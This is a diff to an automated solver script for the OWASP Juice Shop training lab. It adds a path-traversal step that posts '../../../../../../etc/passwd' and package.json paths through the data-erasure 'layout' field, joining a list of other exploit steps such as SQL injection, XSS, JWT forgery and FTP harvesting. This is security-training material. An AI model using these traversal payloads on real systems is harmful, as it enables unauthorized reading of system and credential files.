@@ -606,6 +606,21 @@ def _unsigned_jwt(c):
             pass
 
 
+def _local_file_read(c):
+    """Path traversal via the data-erasure `layout` param renders a local file (Local File Read).
+    The route resolves the path and renders it as long as it isn't an ftp/key file."""
+    import time as _t
+    email = "lfr_%d@x.io" % int(_t.time() * 1000 % 1e9)
+    _register(c, email, "aaaaaa")
+    tok = _login(c, email, "aaaaaa").get("token")
+    H = {"Cookie": "token=%s" % tok, "Authorization": "Bearer %s" % tok} if tok else {}
+    for lay in ("../package.json", "../../package.json", "../../../../../../etc/passwd"):
+        try:
+            c.post("/dataerasure", data={"layout": lay, "email": email, "securityAnswer": "z"}, headers=H)
+        except Exception:
+            pass
+
+
 def solve(base_url: str) -> dict:
     """Run the full Juice Shop lab solver against a live instance; report scoreboard delta."""
     try:
@@ -629,7 +644,7 @@ def solve(base_url: str) -> dict:
                      _multiple_likes, _reflected_and_nosql, _api_and_header_xss, _serverside_xss,
                      _allowlist_bypass, _privacy_and_jwt, _imaginary,
                      _product_tampering, _password_hash_leak, _expired_coupon,
-                     _ftp_harvest, _sqli_union_extract, _view_basket, _unsigned_jwt):
+                     _ftp_harvest, _sqli_union_extract, _view_basket, _unsigned_jwt, _local_file_read):
             try:
                 step(c)
             except Exception:
